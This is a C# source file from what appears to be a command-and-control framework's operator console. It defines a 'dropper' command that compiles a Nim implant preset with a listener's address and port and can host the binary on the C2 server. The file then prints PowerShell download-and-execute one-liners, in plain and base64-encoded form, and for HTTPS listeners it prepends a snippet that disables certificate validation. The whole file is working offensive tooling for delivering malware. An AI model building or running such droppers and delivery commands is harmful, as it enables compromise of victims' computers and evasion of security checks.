using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;

namespace Commander.Commands.Laucher
{
    public class BuildStagerCommandCommandOptions
    {

        public string listenerName { get; set; }

        public string fileName { get; set; }

        public bool debug { get; set; }

        public bool webhost { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }
    }
    public class BuildDropperCommand : EnhancedCommand<BuildStagerCommandCommandOptions>
    {
        public static string PowershellSSlScript  = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";

        public override string Category => CommandCategory.Commander;
        public override string Description => "Create a dropper file";
        public override string Name => "dropper";

        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("listenerName", "name of the listener used"),
            new Option<string>(new[] { "--fileName", "-f" }, () => "dropper" ,"Nome of the file to be crafted"),
            new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildStagerCommandCommandOptions> context)
        {
            var listeners = context.CommModule.GetListeners();
            var listener = listeners.FirstOrDefault(l => l.Name.ToLower() == context.Options.listenerName.ToLower());

            if (listener == null)
            {
                context.Terminal.WriteLine($"No Listener named {context.Options.listenerName}");
                return false;
            }

            string protocol = "http";
            if (listener.Secured)
                protocol = "https";

            var dotnetparms = $"{protocol}:{listener.Ip}:{listener.PublicPort}";

            string outFile = context.Options.fileName;
            if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                outFile += ".exe";
            string outPath = Path.Combine("/tmp", outFile);
            
            var parms = BuildHelper.ComputeNimBuildParameters("dropper", outPath, context.Options.debug, false);

            if (context.Options.x86)
                parms.Insert(3, $"--cpu:i386");
            else
                parms.Insert(3, $"--cpu:amd64");

            //using puppy library prevent the need of ssl
            //if (listener.Secured)
            //{
            //    parms.Insert(3, $"-d:ssl");
            //}
            var fileName = "Agent";
            if (context.Options.x86)
                fileName += "-x86";
            fileName += ".b64";

            parms.Insert(4, $"-d:ServerProtocol={protocol}");
            parms.Insert(5, $"-d:ServerPort={listener.PublicPort}");
            parms.Insert(6, $"-d:ServerAddress={listener.Ip}");
            parms.Insert(7, $"-d:DotNetParams={dotnetparms}");
            parms.Insert(8, $"-d:FileName={fileName}");
            


            context.Terminal.WriteLine($"[>] Generating dropper...");

            if (context.Options.verbose)
                context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
            var executionResult = BuildHelper.NimBuild(parms);

            if (context.Options.verbose)
                context.Terminal.WriteLine(executionResult.Out);
            if (executionResult.Result != 0)
            {
                context.Terminal.WriteError($"[X] Build Failed!");
                return false;
            }

            context.Terminal.WriteSuccess($"[*] Build succeed.");
            context.Terminal.WriteInfo($"Dropper can be found at {outPath}");
            if (context.Options.webhost)
            {
                byte[] fileContent = File.ReadAllBytes(outPath);
                context.CommModule.WebHost(listener.Id, outFile, fileContent);



                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/wh/{outFile}";
                context.Terminal.WriteLine($"[*] dropper hosted on : {url}");

                string script = $"iwr -Uri '{url}' -OutFile '{outFile}'; .\\{outFile}";

                if (listener.Secured)
                {
                    
                    script = PowershellSSlScript + script;
                }

                string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

                //string encoded = Encoding.UTF8.GetString(utf8String)
                context.Terminal.WriteLine($"[>] Command : powershell -c \"{script}\"");
                context.Terminal.WriteLine($"[>] Command : powershell -enc {enc64}");
            }

            return true;
        }
    }

}
